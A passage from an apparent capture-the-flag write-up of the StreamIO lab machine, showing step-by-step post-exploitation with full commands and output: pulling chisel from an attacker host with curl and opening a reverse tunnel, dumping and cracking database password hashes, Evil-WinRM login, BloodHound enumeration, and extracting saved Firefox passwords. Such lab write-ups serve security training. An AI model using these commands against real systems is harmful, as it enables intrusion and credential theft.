<td style="text-align: left;">### Step 5 Inside the box we start to enumerate local files, and quickly we find some database credentials.</td>
</tr>
<tr class="even">
<td style="text-align: left;">```bash PS C:.htb&gt; cat index.php [… snip …] <span class="math inline">\(connection = array("Database"=&gt;"STREAMIO", "UID" =&gt; "db_admin", "PWD" =&gt; 'B1@hx31234567890');\)</span>handle = sqlsrv_connect(‘(local)’,$connection);</td>
</tr>
<tr class="odd">
<td style="text-align: left;">```</td>
</tr>
<tr class="even">
<td style="text-align: left;">Using netstat we find that the database is running on default port <strong>1433</strong>: ```powershell PS C:.htb&gt; netstat -aof [… snip …] TCP 0.0.0.0:1433 DC.streamIO.htb:0 LISTENING 3616</td>
</tr>
<tr class="odd">
<td style="text-align: left;">PS C:.htb&gt; Get-Process -Id 3616 Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName</td>
</tr>
</tbody>
</table>
<pre><code>856      57   442572     317908              3616   0 sqlservr</code></pre>
<pre><code>
To be able to communicate with the service we need to setup a tunnel, we do this using chisel.
```bash
## Setup local listener
➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server --reverse --port 9001

## Upload chisel to victim (note: SMB transfer will get caught)
PS C:\Windows\Tasks&gt; curl http://10.10.14.3:8080/chisel.exe -o chisel.exe

## Run the client to tunnel port 1433
PS C:\Windows\Tasks&gt; .\chisel.exe client 10.10.14.3:9001 R:1433:localhost:1433</code></pre>
<p>Enumerate the database using <code>sqsh</code>:</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>➜ streamio sqsh <span class="op">-</span>S <span class="dv">127</span>.<span class="dv">0</span>.<span class="fl">0.1</span> <span class="op">-</span>U db_admin <span class="op">-</span>P <span class="st">'B1@hx31234567890'</span> <span class="op">-</span>D streamio_backup</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="dv">1</span><span class="op">&gt;</span> <span class="kw">select</span> @@version</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="dv">2</span><span class="op">&gt;</span> go</span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    Microsoft SQL Server <span class="dv">2019</span> (RTM) <span class="op">-</span> <span class="dv">15</span>.<span class="dv">0</span>.<span class="fl">2000.5</span> (X64) </span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    Sep <span class="dv">24</span> <span class="dv">2019</span> <span class="dv">13</span><span class="ch">:48:23</span> </span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>    Copyright (C) <span class="dv">2019</span> Microsoft Corporation</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    Express Edition (<span class="dv">64</span><span class="op">-</span>bit) <span class="kw">on</span> Windows Server <span class="dv">2019</span> Standard <span class="fl">10.0</span> <span class="op">&lt;</span>X64<span class="op">&gt;</span> (<span class="kw">Build</span> <span class="dv">17763</span>: ) (Hypervisor)</span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="dv">1</span><span class="op">&gt;</span> <span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> users;</span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a><span class="dv">2</span><span class="op">&gt;</span> go</span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a> <span class="kw">id</span>     username       <span class="kw">password</span>                                                                                                                                             </span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a> <span class="dv">1</span>      nikk37         <span class="dv">389</span>d14cb8e4e9b94b137deb1caf0612a</span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a> <span class="dv">2</span>      yoshihide      b779ba15cedfd22a023c4d8bcf5f2332</span>
<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a> <span class="dv">3</span>      James          c660060492d9edcaa8332d89c99c9239</span>
<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a> <span class="dv">4</span>      Theodore       <span class="fl">925e5408</span>ecb67aea449373d668b7359e</span>
<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a> <span class="dv">5</span>      Samantha       <span class="dv">083</span>ffae904143c4796e464dac33c1f7d</span>
<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a> <span class="dv">6</span>      Lauren         <span class="dv">08344</span>b85b329d7efd611b7a7743e8a09</span>
<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a> <span class="dv">7</span>      William        d62be0dc82071bccc1322d64ec5b6c51</span>
<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a> <span class="dv">8</span>      Sabrina        f87d3c0d6c8fd686aacc6627f1f493a5</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Save the users and it’s hash to a file and start to crack them with hashcat.</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio hashcat <span class="at">-a0</span> <span class="at">-m0</span> db-users.txt /usr/share/wordlists/rockyou.txt <span class="at">--user</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio hashcat <span class="at">-a0</span> <span class="at">-m0</span> db-users.txt /usr/share/wordlists/rockyou.txt <span class="at">--user</span> <span class="at">--show</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We find one new set of credentials - <code>nikk37:get_dem_girls2@yahoo.com</code>. Login with Evil-WinRM and grab that user flag!</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio evil-winrm <span class="at">-i</span> 10.10.11.158 <span class="at">-u</span> nikk37 <span class="at">-p</span> get_dem_girls2@yahoo.com</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">*Evil-WinRM*</span> PS C:<span class="dt">\U</span>sers<span class="dt">\n</span>ikk37<span class="dt">\D</span>esktop<span class="op">&gt;</span> cat user.txt</span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="ex">3e11807b2fae875626ee550f08bd5336</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Look on groups, privileges and powershell history.</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co">## History (none)</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\nikk37\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<span class="op">&gt;</span> <span class="fu">Get-ChildItem</span> <span class="op">-</span>Force</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co">## Groups and Privileges</span></span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users<span class="op">&gt;</span> whoami <span class="op">/</span>all</span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>USER INFORMATION</span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="op">----------------</span></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>User Name       SID</span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="op">===============</span> <span class="op">==============================================</span></span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>streamio\nikk37 S-1-5-21-1470860369-1569627196-4264678630-1106</span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="fu">GROUP</span> INFORMATION</span>
<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="op">-----------------</span></span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="fu">Group</span> Name                                  <span class="fu">Type</span>             SID          Attributes</span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a><span class="op">===========================================</span> <span class="op">================</span> <span class="op">============</span> <span class="op">==================================================</span></span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a>Everyone                                    Well-known <span class="fu">group</span> S-1-1-0      Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a>BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a>BUILTIN\Pre-Windows <span class="dv">2000</span> Compatible Access  Alias            S-1-5-32-554 Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\NETWORK                        Well-known <span class="fu">group</span> S-1-5-2      Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\Authenticated Users            Well-known <span class="fu">group</span> S-1-5-11     Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\This Organization              Well-known <span class="fu">group</span> S-1-5-15     Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>NT AUTHORITY\NTLM Authentication            Well-known <span class="fu">group</span> S-1-5-64-10  Mandatory <span class="fu">group</span><span class="op">,</span> Enabled by default<span class="op">,</span> Enabled <span class="fu">group</span></span>
<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a>Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span>
<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>PRIVILEGES INFORMATION</span>
<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a><span class="op">----------------------</span></span>
<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>Privilege Name                Description                    State</span>
<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a><span class="op">=============================</span> <span class="op">==============================</span> <span class="op">=======</span></span>
<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a>SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a>SeIncreaseWorkingSetPrivilege Increase a <span class="cf">process</span> working <span class="fu">set</span> Enabled</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Nothing that’s really out of the ordinary, next check should be <strong>Kerberoast</strong> and <strong>BloodHound</strong>.</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio bloodhound-python <span class="at">-u</span> nikk37 <span class="at">-p</span> <span class="st">'get_dem_girls2@yahoo.com'</span> <span class="at">-ns</span> 10.10.11.158 <span class="at">-d</span> streamio.htb <span class="at">-c</span> all</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found AD domain: streamio.htb</span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Connecting to LDAP server: dc.streamio.htb</span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 1 domains</span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 1 domains in the forest</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 1 computers</span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Connecting to LDAP server: dc.streamio.htb</span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 8 users</span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Connecting to GC LDAP server: dc.streamio.htb</span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 54 groups</span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 0 trusts</span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Starting computer enumeration with 10 workers</span>
<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Querying computer: DC.streamIO.htb</span>
<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Done in 00M 05S</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Running the raw query <code>MATCH (u:User {hasspn:true}) RETURN u</code> in Bloodhound we find all users that are Kerberoastable - unfortunatley we only find <code>krbtgt</code> which is default. <br> Analyzing further with BloodHound we can’t find anything of use from <code>nikk37</code>. However searching from the domain (<code>STREAMIO.HTB</code>) and selecting “Shortest Path to Here” we find two interesting users - <code>Martin</code> and <code>JDGODD</code>.</p>
<p><img src="images/streamio02.png" class="img-fluid"></p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Enumerating the box localy we find that Mozilla Firefox is installed. With the box <a href="https://exploit.se/htb-writeup-hancliffe/">Hancliffe</a> relatively fresh in mind, firefox profiles is something that we love to find.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release<span class="op">&gt;</span> <span class="fu">ls</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>Mode                LastWriteTime         Length Name</span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="op">----</span>                <span class="op">-------------</span>         <span class="op">------</span> <span class="op">----</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">2</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">2</span><span class="op">:</span><span class="dv">41</span> AM         <span class="dv">229376</span> cert9<span class="op">.</span><span class="fu">db</span></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">2</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">2</span><span class="op">:</span><span class="dv">40</span> AM          <span class="dv">98304</span> cookies<span class="op">.</span><span class="fu">sqlite</span></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">2</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">2</span><span class="op">:</span><span class="dv">40</span> AM         <span class="dv">294912</span> key4<span class="op">.</span><span class="fu">db</span></span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">2</span><span class="op">/</span><span class="dv">22</span><span class="op">/</span><span class="dv">2022</span>   <span class="dv">2</span><span class="op">:</span><span class="dv">41</span> AM           <span class="dv">2081</span> logins<span class="op">.</span><span class="fu">json</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>All four files that we need to extract credentials are there. Download them to your local machine, setup a tree structure like the victim and use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a> to extract loot.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release<span class="op">&gt;</span> download C<span class="op">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op">.</span><span class="fu">default</span><span class="op">-</span>release\cert9<span class="op">.</span><span class="fu">db</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>                                                             </span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>Info<span class="op">:</span> Download successful<span class="op">!</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  streamio tree</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">├──</span> firefox-loot</span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span> └── br53rxeg.default-release</span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span>     ├── cert9.db</span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span>     ├── cookies.sqlite</span>
<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span>     ├── key4.db</span>
<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">│&nbsp;&nbsp;</span>     └── logins.json</span>
<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  firefox_decrypt git:<span class="er">(</span><span class="ex">master</span><span class="kw">)</span> <span class="ex">✗</span> ./firefox_decrypt.py /htb/streamio/firefox-loot/br53rxeg.default-release </span>
<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-08-02</span> 16:23:13,335 <span class="at">-</span> WARNING <span class="at">-</span> profile.ini not found in /htb/streamio/firefox-loot/br53rxeg.default-release</span>
<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-08-02</span> 16:23:13,335 <span class="at">-</span> WARNING <span class="at">-</span> Continuing and assuming <span class="st">'/htb/streamio/firefox-loot/br53rxeg.default-release'</span> is a profile location</span>
<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> <span class="st">'admin'</span></span>
<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> <span class="st">'JDg0dd1s@d0p3cr3@t0r'</span></span>
<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> <span class="st">'nikk37'</span></span>
<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> <span class="st">'n1kk1sd0p3t00:)'</span></span>
<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> <span class="st">'yoshihide'</span></span>
<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> <span class="st">'paddpadd@12'</span></span>
<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> <span class="st">'JDgodd'</span></span>
<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> <span class="st">'password@12'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>None of the found credentials / passwords work over WinRM with neither <code>Martin</code>, <code>JDGODD</code> or <code>Administrator</code>..<br> Nor are we allowed to execute commands remotely using script blocks:</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users<span class="op">&gt;</span> <span class="va">$user</span> <span class="op">=</span> <span class="st">'JDgodd'</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users<span class="op">&gt;</span> <span class="va">$pass</span> <span class="op">=</span> <span class="st">'JDg0dd1s@d0p3cr3@t0r'</span> <span class="op">|</span> <span class="fu">ConvertTo-SecureString</span> <span class="op">-</span>AsPlainText <span class="op">-</span>Force</span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users<span class="op">&gt;</span> <span class="va">$creds</span> <span class="op">=</span> <span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Management</span><span class="op">.</span><span class="fu">Automation</span><span class="op">.</span><span class="fu">PSCredential</span><span class="op">(</span><span class="va">$user</span><span class="op">,</span><span class="va">$pass</span><span class="op">)</span></span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>Evil-WinRM<span class="op">*</span> <span class="fu">PS</span> C<span class="op">:</span>\Users<span class="op">&gt;</span> <span class="fu">Invoke-Command</span> <span class="op">-</span>ComputerName localhost <span class="op">-</span>Credential <span class="va">$creds</span> <span class="op">-</span>ScriptBlock <span class="op">{</span> whoami <span class="op">}</span></span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>Connecting to remote server localhost failed with the following error message <span class="op">:</span> Access is denied<span class="op">.</span> <span class="cf">For</span> more information<span class="op">,</span> see the about_Remote_Troubleshooting Help topic<span class="op">.</span></span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">+</span> CategoryInfo          <span class="op">:</span> OpenError<span class="op">:</span> <span class="op">(</span>localhost<span class="op">:</span>String<span class="op">)</span> <span class="op">[],</span> PSRemotingTransportException</span>
<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">+</span> FullyQualifiedErrorId <span class="op">:</span> AccessDenied<span class="op">,</span>PSSessionStateBroken</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Instead of trial and error with username/password combination like above, we can use crackmapexec to confirm that the creds <code>jdgodd:JDg0dd1s@d0p3cr3@t0r</code> work. However we need to find a way to use them.</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>➜ streamio crackmapexec smb <span class="dv">10.10</span><span class="op">.</span><span class="dv">11.158</span> <span class="op">-</span>u jdgodd <span class="op">-</span>p <span class="st">"JDg0dd1s@d0p3cr3@t0r"</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>SMB         <span class="dv">10.10</span><span class="op">.</span><span class="dv">11.158</span>    <span class="dv">445</span>    DC               <span class="op">[*]</span> Windows <span class="dv">10.0</span> Build <span class="dv">17763</span> x64 <span class="op">(</span>name<span class="op">:</span>DC<span class="op">)</span> <span class="op">(</span>domain<span class="op">:</span>streamIO<span class="op">.</span><span class="fu">htb</span><span class="op">)</span> <span class="op">(</span>signing<span class="op">:</span>True<span class="op">)</span> <span class="op">(</span>SMBv1<span class="op">:</span>False<span class="op">)</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>SMB         <span class="dv">10.10</span><span class="op">.</span><span class="dv">11.158</span>    <span class="dv">445</span>    DC               <span class="op">[+]</span> streamIO<span class="op">.</span><span class="fu">htb</span>\jdgodd<span class="op">:</span>JDg0dd1s@d0p3cr3@t0r </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
